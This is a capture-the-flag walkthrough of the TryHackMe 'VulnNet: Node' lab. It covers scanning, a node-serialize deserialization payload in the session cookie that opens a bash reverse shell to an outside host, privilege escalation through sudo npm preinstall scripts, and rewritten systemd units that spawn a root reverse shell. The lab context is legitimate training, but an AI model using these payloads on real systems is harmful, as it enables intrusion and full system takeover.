---
created: 29-01-2026
---
- [VulnNet: Node](https://tryhackme.com/room/vulnnetnode)
## Web application

- Starting with port scanning:

```bash
sudo nmap 10.65.134.217
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-29 16:48 UTC
Nmap scan report for 10.65.134.217
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 3.00 seconds
```

![[VulnNet_8080.png]]

In the response headers, we see:

```
X-Powered-By: Express
```

This application is running Node.js. From the text on the page we discover that recently the website was breached.



- Let's enumerate directories and files accessible without authentication:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.65.134.217:8080/FUZZ -e html,txt -ic -c -s
```

```
img
login
css
Login
IMG
CSS 
Img
```

Two different login pages: `login` and `Login`. However, if we compare MD5 hashes of these two pages, we see they're identical:

```bash
curl http://10.65.134.217:8080/login
1fcbd2e9dc9109b5a1e25e7a0976a3f4  -
```

```bash
curl -s http://10.65.134.217:8080/Login | md5sum
1fcbd2e9dc9109b5a1e25e7a0976a3f4  -
```

What this means is that the server serves pages case-insenstiviely.

Let's finally inspect this login page:



![[login.png]]

Sending arbitrary credentials, here is what we receive:

![[login_attempt.png]]

The login form is apparently not working properly.

The session token is actually a URL-encoded Base64-encoded JSON string:

```JSON
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```

Of course, the first idea that came to my mind is to change the session ID:


![[changing_session_id.png]]

But this reminded me of insecure deserialization attacks. May be worth trying?

See [`Node.md — Insecure Deserialiation, PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Node.md).

- To create a reverse shell:

```bash
nc -lvnp 1337
```


- Send a request with the following payload in the `session` cookie (Base64 and then URL-encoded):

```JSON
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/192.168.148.230/1337 0>&1'\", function(error,stdout, stderr) { console.log(stdout) });}()"}
```

![[reverse_shell.png]]

>[!note] See [`Exploiting Node.js deserialization bug for Remote Code Execution — OpSecX`](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

- Once you connect, get a normal interactive shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

```bash
^Z
```

```bash
stty raw -echo && fg
```

Here you can see `server.js` — the vulnerable code thanks to which we were able to get the shell:

```bash
ls
```

```bash
css
img
index.pug
LICENSE.txt
login.html
node_modules
package.json
package-lock.json
server.js
```

```bash
cat server.js
```

```JS
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var path = require('path');
var app = express();
app.use(cookieParser())
app.set('view engine',  'pug');

app.use('/css', express.static('css'));
app.use('/img', express.static('img'));

app.get('/', function(req, res) {
 if (req.cookies.session) {
   var str = new Buffer(req.cookies.session, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     var username2 = JSON.stringify(obj.username).replace(/[^0-9a-z]/gi, '');
     obj.username = username2
     res.render('../index', {username: obj.username})
   }
 } else {
     res.cookie('session', "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ==", {
       maxAge: 1200000,
       httpOnly: true
     });
 }
res.render('../index', {username: "Guest"});
});

app.get('/login', function(req, res) {
	res.sendFile(path.join(__dirname+'/login.html'));
});
```

## Privilege escalation to `serv-manage`

```bash
id
uid=1001(www) gid=1001(www) groups=1001(www)
```

- Check `sudo`:

```bash
sudo -l
```

```bash
Matching Defaults entries for www on ip-10-66-154-132:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on ip-10-66-154-132:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

- There is a known exploit on how to get a shell with `npm` in [GTFOBins](https://gtfobins.org/gtfobins/npm/#shell):

```sh
sudo -u serv-manage npm exec /bin/sh -p
```

But it doesn't work, unfortunately.

- Let's try another method:

```bash
cd
```

```bash
echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json 
```

```bash
sudo -u serv-manage npm -C . i
```

```bash
> @ preinstall /home/www
> /bin/sh

$ id
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
```

Works!

```bash
cd
```

```bash
cat user.txt
THM{064640a2f880ce9ed7a54886f1bde821}
```

## Privilege escalation to root

- Checking `sudo`:

```bash
sudo -l
```

```bash
Matching Defaults entries for serv-manage on ip-10-66-154-132:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on ip-10-66-154-132:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

This is interesting. 

```bash
find / -name 'vulnnet-auto.timer' -ls 2>/dev/null
```

```bash
157586      4 -rw-rw-r--   1 root     serv-manage      167 Jan 24  2021 /etc/systemd/system/vulnnet-auto.timer
```

- Let's see what's inside:

This timer can be modified by the current user, `serv-manage`. But it would run as root if we start it (since it's owned by the root user) — which we can do.

```bash
cat /etc/systemd/system/vulnnet-auto.timer
```

```bash
[Unit]
Description=Run VulnNet utilities every 1 min

[Timer]
OnBootSec=0min
OnCalendar=*:0/1
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

- Find the service:

```bash
find / -name 'vulnnet-job.service' -ls 2>/dev/null
```

```bash
   157585      4 -rw-rw-r--   1 root     serv-manage      197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service
```

- Output:

```bash
cat /etc/systemd/system/vulnnet-job.service
```

```bash
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

- Create a reverse shell:

```bash
cat << EOF > /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every min

[Timer]
OnBootSec=0min
OnCalendar=*:0/1
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
EOF
```

```bash
cat << EOF > /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.148.230/1338 0>&1'

[Install]
WantedBy=multi-user.target
EOF
```

- Set up a listener on your machine:

```bash
rlwrap nc -lvnp 1338
```

- Then start the timer:

```bash
sudo /bin/systemctl start vulnnet-auto.timer
```

```bash
sudo /bin/systemctl daemon-reload
```

 - Get the shell!

```bash
rlwrap nc -lvnp 1338
listening on [any] 1338 ...

connect to [192.168.148.230] from (UNKNOWN) [10.66.154.132] 33608
bash: cannot set terminal process group (1808): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-66-154-132:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-66-154-132:/# 
```

- Then get the flag:

```bash
cd /root
```

```bash 
cat root.txt
THM{abea728f211b105a608a720a37adabf9}
```
